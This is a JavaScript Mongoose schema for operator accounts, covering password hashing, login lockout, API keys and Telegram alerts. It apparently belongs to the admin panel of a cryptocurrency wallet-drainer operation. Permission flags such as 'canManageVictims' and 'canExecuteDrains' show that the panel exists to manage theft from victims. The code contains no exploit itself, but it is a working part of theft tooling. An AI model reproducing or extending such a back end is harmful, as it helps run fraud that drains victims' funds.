const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');

const userSchema = new mongoose.Schema({
    username: {
        type: String,
        required: true,
        unique: true,
        trim: true,
        minlength: 3,
        maxlength: 50
    },
    email: {
        type: String,
        required: true,
        unique: true,
        trim: true,
        lowercase: true,
        match: [/^\w+([.-]?\w+)*@\w+([.-]?\w+)*(\.\w{2,3})+$/, 'Please enter a valid email']
    },
    password: {
        type: String,
        required: true,
        minlength: 8
    },
    role: {
        type: String,
        enum: ['admin', 'operator', 'viewer'],
        default: 'operator'
    },
    status: {
        type: String,
        enum: ['active', 'inactive', 'suspended'],
        default: 'active'
    },
    permissions: {
        canViewDashboard: {
            type: Boolean,
            default: true
        },
        canManageVictims: {
            type: Boolean,
            default: false
        },
        canManageTransactions: {
            type: Boolean,
            default: false
        },
        canManageContracts: {
            type: Boolean,
            default: false
        },
        canExecuteDrains: {
            type: Boolean,
            default: false
        },
        canViewLogs: {
            type: Boolean,
            default: true
        },
        canManageSettings: {
            type: Boolean,
            default: false
        }
    },
    lastLogin: Date,
    loginAttempts: {
        type: Number,
        default: 0
    },
    lockUntil: Date,
    twoFactorEnabled: {
        type: Boolean,
        default: false
    },
    twoFactorSecret: String,
    apiKeys: [{
        name: String,
        key: String,
        permissions: [String],
        createdAt: {
            type: Date,
            default: Date.now
        },
        lastUsed: Date,
        active: {
            type: Boolean,
            default: true
        }
    }],
    notifications: {
        email: {
            type: Boolean,
            default: true
        },
        telegram: {
            type: Boolean,
            default: false
        },
        telegramChatId: String,
        webhook: {
            url: String,
            active: {
                type: Boolean,
                default: false
            }
        }
    },
    preferences: {
        theme: {
            type: String,
            enum: ['dark', 'light'],
            default: 'dark'
        },
        timezone: {
            type: String,
            default: 'UTC'
        },
        language: {
            type: String,
            default: 'en'
        },
        dashboardLayout: String
    },
    activityLog: [{
        action: String,
        ipAddress: String,
        userAgent: String,
        timestamp: {
            type: Date,
            default: Date.now
        }
    }]
}, {
    timestamps: true
});

// Virtual for account lock
userSchema.virtual('isLocked').get(function() {
    return !!(this.lockUntil && this.lockUntil > Date.now());
});

// Pre-save middleware to hash password
userSchema.pre('save', async function(next) {
    if (!this.isModified('password')) return next();

    try {
        const salt = await bcrypt.genSalt(12);
        this.password = await bcrypt.hash(this.password, salt);
        next();
    } catch (error) {
        next(error);
    }
});

// Method to compare password
userSchema.methods.comparePassword = async function(candidatePassword) {
    return bcrypt.compare(candidatePassword, this.password);
};

// Method to increment login attempts
userSchema.methods.incLoginAttempts = function() {
    if (this.lockUntil && this.lockUntil < Date.now()) {
        return this.updateOne({
            $unset: { lockUntil: 1 },
            $set: { loginAttempts: 1 }
        });
    }

    const updates = { $inc: { loginAttempts: 1 } };

    if (this.loginAttempts + 1 >= 5 && !this.isLocked) {
        updates.$set = {
            lockUntil: Date.now() + 2 * 60 * 60 * 1000 // 2 hours
        };
    }

    return this.updateOne(updates);
};

// Method to reset login attempts
userSchema.methods.resetLoginAttempts = function() {
    return this.updateOne({
        $unset: { loginAttempts: 1, lockUntil: 1 },
        $set: { lastLogin: new Date() }
    });
};

// Indexes
userSchema.index({ email: 1 });
userSchema.index({ username: 1 });
userSchema.index({ role: 1 });
userSchema.index({ status: 1 });

module.exports = mongoose.model('User', userSchema);